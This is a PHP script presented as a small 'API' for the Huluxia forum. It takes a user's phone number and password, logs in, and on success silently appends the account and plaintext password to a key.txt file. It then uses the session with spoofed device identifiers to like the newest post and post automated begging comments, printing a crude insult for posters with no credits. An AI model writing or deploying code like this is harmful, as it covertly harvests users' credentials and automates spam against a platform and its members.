<title>小JnAPI</title><?php

//需要参数phone，key
ini_set("display_errors","off");

//登录
$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"],false);
$r=$_GET["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];

switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
   //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
    break;
}if($key==null){echo "未登录";}else {
    
//乞讨葫芦
  $url="http://floor.huluxia.com/post/list/ANDROID/2.1?platform=2&gkey=000000&app_version=4.0.0.7&versioncode=20141436&market_id=floor_huluxia&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00-%5Bi%5D866934037372573-%5Bs%5D89861119147385482175&start=0&count=20&cat_id=2&tag_id=0&sort_by=1";
  $post=file_get_contents($url);
  $post=json_decode($post,true);
  $pid=$post["posts"][0]["postID"];//最新帖子ID
  //执行点赞
$key=$returnJson["_key"];

    $gzdf = "http://floor.huluxia.com/post/praise/ANDROID/2.1?platform=2&gkey=000000&app_version=4.1.1.2.2&versioncode=318&market_id=tool_tencent&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00%5Bd%5De2f734cc-549b-4349-a311-244c64fcc71e&post_id=
".$pid;
   echo "返回信息".$gzgzgz4 = file_get_contents($gzdf);
   
  $postJson=file_get_contents("http://floor.huluxia.com/post/detail/ANDROID/2.3?post_id=".$pid);
$postArray=json_decode($postJson,true);
$title=$postArray["post"]["title"];
$url2 = "http://". $_SERVER['HTTP_HOST']."/jnjqrapi.php?name=小Jn"."&q=".$title;
   $html = file_get_contents($url2)."[滑稽][玫瑰]";
   //获取评论拟人
$file = file("pl.txt");
//随机读取一行
$arr  = mt_rand( 0, count( $file ) - 1 );
echo"<br>回复内容:";
echo$content  = trim($file[$arr],"\n");
 //获取评论图片轮换
$file2 = file("tp.txt");
//随机读取一行
$arr2  = mt_rand( 0, count( $file2 ) - 1 );

$tp  = trim($file2[$arr2],"\n");
echo$hulu=$post["posts"][0]["user"]["credits"];//葫芦数

  if($pid==file_get_contents("pid.txt"))
  {
    echo "已回复";
  }
  else
  {
    echo$hulu=$post["posts"][0]["user"]["credits"];//葫芦数
    if($hulu=="0"){echo"你遇上一个一个葫芦都没有的穷逼，本次不回复";}else{
  echo  $url666="http://floor.huluxia.com/comment/create/ANDROID/2.0?platform=2&gkey=000000&app_version=4.0.0.7&versioncode=20141436&market_id=floor_huluxia&_key=".$key."&device_code=%5Bw%5D02%3A00%3A00%3A00%3A00%3A00-%5Bi%5D866934037372573-%5Bs%5D89861119147385482175&post_id=".$pid."&comment_id=0&text=".$html."%0A".$hulu.$content ."&patcha=&images=".$tp.'%2C&remindUsers=';
   echo file_get_contents($url666);
    file_put_contents("pid.txt",$pid);
  }}}